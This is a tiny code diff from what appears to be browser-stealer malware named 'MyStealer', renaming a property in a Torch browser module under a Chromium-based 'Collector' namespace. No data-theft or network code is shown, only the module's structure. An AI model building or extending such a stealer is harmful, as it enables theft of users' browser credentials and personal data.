@@ -5,7 +5,7 @@ namespace MyStealer.Collector.Browser.ChromiumBased
 {
     public class Torch : Chromium
     {
-        public override string ModuleName => "Torch";
+        public override string Name => "Torch";
 
         public override bool HasProfiles => false;
 
